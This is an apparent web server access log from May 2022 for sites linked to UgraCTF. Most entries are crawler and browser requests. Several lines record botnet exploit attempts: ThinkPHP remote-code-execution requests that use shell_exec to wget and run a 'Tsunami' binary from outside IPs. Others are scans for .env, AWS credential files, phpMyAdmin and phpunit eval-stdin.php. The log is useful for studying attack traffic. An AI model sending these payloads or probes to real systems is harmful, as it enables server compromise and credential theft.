12.240.32.81 - - [15/May/2022:00:00:19 +0300] "GET /f2035be396/c7e9d9807d/5401 HTTP/1.1" 301 162 "-" "-"
135.106.106.237 - - [15/May/2022:02:57:03 +0300] "GET //phpMyAdmi/scripts/setup.php HTTP/1.1" 301 162 "-" "-"
41.208.82.250 - - [15/May/2022:02:57:04 +0300] "GET //phpMyAdmin-2.5.5/index.php HTTP/1.1" 301 162 "-" "-"
28.25.59.231 - - [15/May/2022:02:57:04 +0300] "GET //phpMyAdmin-2.5.5-pl1/index.php HTTP/1.1" 301 162 "-" "-"
68.133.58.80 - - [15/May/2022:02:59:51 +0300] "GET / HTTP/1.1" 200 415 "-" "python-requests/2.27.1"
102.136.69.204 - - [15/May/2022:03:00:12 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=day&date=2022-05-14&format=json&trigger=archivephp& HTTP/2.0" 200 38 "-" "Matomo/4.7.1"
198.22.219.70 - - [15/May/2022:03:00:13 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=week&date=2022-05-09&format=json&trigger=archivephp& HTTP/2.0" 200 36 "-" "Matomo/4.7.1"
89.43.187.254 - - [15/May/2022:03:00:13 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=month&date=2022-05-01&format=json&trigger=archivephp& HTTP/2.0" 200 37 "-" "Matomo/4.7.1"
235.60.210.63 - - [15/May/2022:03:00:14 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=year&date=2022-01-01&format=json&trigger=archivephp& HTTP/2.0" 200 38 "-" "Matomo/4.7.1"
29.218.146.222 - - [15/May/2022:03:03:38 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
209.101.198.113 - - [15/May/2022:03:12:33 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
190.21.252.241 - - [15/May/2022:03:15:13 +0300] "GET / HTTP/1.1" 303 218 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
108.96.231.193 - - [15/May/2022:03:16:40 +0300] "GET /tasks HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
149.227.50.92 - - [15/May/2022:03:19:54 +0300] "GET / HTTP/2.0" 200 4235 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
118.206.90.80 - - [15/May/2022:03:19:55 +0300] "GET /static/css/kettle-anim.css HTTP/2.0" 200 6067 "https://kettlec.tf/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
240.41.6.116 - - [15/May/2022:03:19:55 +0300] "GET /static/css/style.css HTTP/2.0" 200 2202 "https://kettlec.tf/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
210.2.50.92 - - [15/May/2022:03:19:55 +0300] "GET /static/js/lang.js HTTP/2.0" 200 465 "https://kettlec.tf/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
174.227.213.21 - - [15/May/2022:03:19:55 +0300] "GET /static/img/tt.svg HTTP/2.0" 200 22443 "https://kettlec.tf/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
168.68.158.145 - - [15/May/2022:03:19:55 +0300] "GET /static/css/ui.css HTTP/2.0" 200 1898 "https://kettlec.tf/static/css/style.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
55.169.203.21 - - [15/May/2022:03:19:56 +0300] "GET /static/img/kettle-anim.svg HTTP/2.0" 200 14389 "https://kettlec.tf/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
86.97.3.242 - - [15/May/2022:03:23:06 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
179.132.200.138 - - [15/May/2022:03:23:54 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.148.8/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Tsunami.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
116.35.171.39 - - [15/May/2022:03:23:55 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.148.8/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Tsunami.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
227.105.90.48 - - [15/May/2022:03:28:55 +0300] "GET /scores?0.9488562122973347 HTTP/1.1" 200 118704 "https://course.ugractf.ru/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268"
95.180.59.228 - - [15/May/2022:03:33:16 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
201.230.76.10 - - [15/May/2022:03:38:38 +0300] "GET /robots.txt HTTP/1.1" 502 150 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
190.89.196.172 - - [15/May/2022:03:38:39 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
78.155.0.60 - - [15/May/2022:03:38:39 +0300] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
174.186.162.80 - - [15/May/2022:03:42:51 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
19.108.254.189 - - [15/May/2022:03:50:46 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
3.91.236.252 - - [15/May/2022:03:51:19 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.189.1.53/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
51.233.138.15 - - [15/May/2022:03:51:29 +0300] "GET /reverse/task-c.html HTTP/2.0" 200 1961 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
118.204.52.31 - - [15/May/2022:04:00:05 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://144.172.70.166/bns/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "puzzles/2.0"
2.131.227.36 - - [15/May/2022:04:02:02 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
149.49.106.174 - - [15/May/2022:04:02:06 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
70.213.4.214 - - [15/May/2022:04:02:06 +0300] "GET /web/task-a.html HTTP/1.1" 200 1957 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
60.55.249.152 - - [15/May/2022:04:11:07 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
175.13.70.28 - - [15/May/2022:04:11:27 +0300] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.56.80.63 - - [15/May/2022:04:11:27 +0300] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x030\xBE\x08\xDD\xB5\x16m:\xEFz\x8A@\x8Ba\xD4\xCC\xABHP\x1C\x991\x91(\xB2M\x06\xA9\xB7+\xD47 q\x11\xE5\x18\xA9\x98r\xBB\x9EO\x9D\xB8\xA2\x0F\x0E\x1E\x12E\x1F\xFD,b\xEBR\xDA\xF3\xFE\x8Fs\xE4\xEE\xC0\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 150 "-" "-"
122.241.228.141 - - [15/May/2022:04:11:27 +0300] "POST /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
7.62.160.80 - - [15/May/2022:04:11:27 +0300] "GET /.aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
252.175.123.128 - - [15/May/2022:04:11:28 +0300] "POST /.aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.52.110.244 - - [15/May/2022:04:11:28 +0300] "GET /.aws/config HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
58.220.43.216 - - [15/May/2022:04:11:28 +0300] "POST /.aws/config HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
63.17.134.181 - - [15/May/2022:04:11:28 +0300] "GET /aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
79.19.220.186 - - [15/May/2022:04:11:28 +0300] "POST /aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
53.245.246.234 - - [15/May/2022:04:11:28 +0300] "GET /.aws HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
0.159.53.187 - - [15/May/2022:04:11:28 +0300] "POST /.aws HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
138.123.178.206 - - [15/May/2022:04:11:28 +0300] "GET /public/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.194.114.146 - - [15/May/2022:04:11:28 +0300] "POST /public/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
183.208.88.176 - - [15/May/2022:04:11:28 +0300] "GET /public/.aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.233.136.20 - - [15/May/2022:04:11:28 +0300] "POST /public/.aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
72.35.169.45 - - [15/May/2022:04:11:28 +0300] "GET /.aws/config HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
39.137.225.195 - - [15/May/2022:04:11:29 +0300] "POST /.aws/config HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.85.78.182 - - [15/May/2022:04:11:29 +0300] "GET /public/aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.243.106.161 - - [15/May/2022:04:11:29 +0300] "POST /public/aws/credentials HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
176.20.237.190 - - [15/May/2022:04:11:29 +0300] "GET /public/.aws HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
168.31.138.42 - - [15/May/2022:04:11:29 +0300] "POST /public/.aws HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
73.236.106.227 - - [15/May/2022:04:11:43 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
99.168.188.152 - - [15/May/2022:04:16:38 +0300] "GET /robots.txt HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
142.33.70.151 - - [15/May/2022:04:16:42 +0300] "GET /tasks HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
174.227.213.21 - - [15/May/2022:04:18:07 +0300] "GET / HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
72.35.169.45 - - [15/May/2022:04:19:54 +0300] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
10.176.86.65 - - [15/May/2022:04:19:54 +0300] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
27.252.73.167 - - [15/May/2022:04:19:54 +0300] "GET /.env HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
39.137.225.195 - - [15/May/2022:04:19:55 +0300] "POST / HTTP/1.1" 405 150 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
57.187.64.29 - - [15/May/2022:04:19:58 +0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
52.115.18.79 - - [15/May/2022:04:19:59 +0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
227.105.90.48 - - [15/May/2022:04:27:42 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
10.176.86.65 - - [15/May/2022:04:29:23 +0300] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 146 "-" "Mozilla/5.0 zgrab/0.x"
156.245.236.251 - - [15/May/2022:04:30:10 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.148.8/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Tsunami.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
232.121.79.42 - - [15/May/2022:04:31:44 +0300] "GET /robots.txt HTTP/2.0" 404 146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
58.220.43.216 - - [15/May/2022:04:31:45 +0300] "GET /pr/2021-03-12 HTTP/2.0" 200 5448 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
205.149.93.219 - - [15/May/2022:04:40:53 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
99.233.174.158 - - [15/May/2022:04:42:17 +0300] "GET /robots.txt HTTP/1.1" 303 146 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
175.156.34.165 - - [15/May/2022:04:42:19 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
147.206.106.74 - - [15/May/2022:04:42:43 +0300] "GET / HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
148.127.219.43 - - [15/May/2022:04:42:44 +0300] "GET /favicon.ico HTTP/2.0" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
140.174.34.162 - - [15/May/2022:04:44:40 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
86.67.79.45 - - [15/May/2022:04:44:40 +0300] "GET /pr/2020-04-08 HTTP/1.1" 200 4548 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
246.27.76.102 - - [15/May/2022:04:46:29 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
203.38.95.129 - - [15/May/2022:04:49:29 +0300] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.147.18.181 - - [15/May/2022:04:49:29 +0300] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
30.237.71.164 - - [15/May/2022:04:49:30 +0300] "GET /.env HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
117.12.219.23 - - [15/May/2022:04:49:30 +0300] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
238.172.5.86 - - [15/May/2022:04:49:51 +0300] "GET / HTTP/1.1" 301 162 "http://95.217.155.244:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
238.172.5.86 - - [15/May/2022:04:51:38 +0300] "GET /crypto/index.html HTTP/1.1" 200 3829 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
119.58.131.189 - - [15/May/2022:04:52:30 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.233.211.95 - - [15/May/2022:04:52:31 +0300] "GET / HTTP/1.1" 200 1161 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.93.198.43 - - [15/May/2022:04:54:12 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
18.210.20.111 - - [15/May/2022:04:54:12 +0300] "GET /intro/pic/hnul.svg HTTP/1.1" 200 52756 "https://2022.ugractf.ru/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
56.137.44.80 - - [15/May/2022:04:54:13 +0300] "GET /osint/pic/main.svg HTTP/1.1" 200 67392 "https://2022.ugractf.ru/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
110.191.60.226 - - [15/May/2022:04:54:14 +0300] "GET /web/pic/web.svg HTTP/1.1" 200 40828 "https://2022.ugractf.ru/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.229.246.117 - - [15/May/2022:04:55:46 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
78.155.0.60 - - [15/May/2022:05:04:18 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
171.41.18.0 - - [15/May/2022:05:05:04 +0300] "GET /robots.txt HTTP/1.1" 308 294 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
80.83.16.144 - - [15/May/2022:05:05:04 +0300] "GET /robots.txt/ HTTP/1.1" 200 2278 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
230.202.202.38 - - [15/May/2022:05:05:08 +0300] "GET / HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
74.50.9.220 - - [15/May/2022:05:07:34 +0300] "GET /crypto/history.html HTTP/2.0" 200 16031 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
210.136.90.25 - - [15/May/2022:05:07:34 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
31.183.182.19 - - [15/May/2022:05:07:34 +0300] "GET /static/highlight/styles/github.css HTTP/2.0" 200 1148 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
124.195.194.139 - - [15/May/2022:05:07:34 +0300] "GET /static/book.js HTTP/2.0" 200 1116 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
45.64.37.13 - - [15/May/2022:05:07:35 +0300] "GET /static/highlight/highlight.pack.js HTTP/2.0" 200 108750 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
70.186.206.203 - - [15/May/2022:05:07:35 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
144.119.73.185 - - [15/May/2022:05:07:35 +0300] "GET /crypto/pic/caesar.svg HTTP/2.0" 200 29045 "https://course.ugractf.ru/crypto/history.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
48.183.230.27 - - [15/May/2022:05:07:35 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
9.6.151.11 - - [15/May/2022:05:07:35 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
70.186.206.203 - - [15/May/2022:05:07:35 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
148.251.235.5 - - [15/May/2022:05:07:35 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
85.19.16.72 - - [15/May/2022:05:07:35 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59"
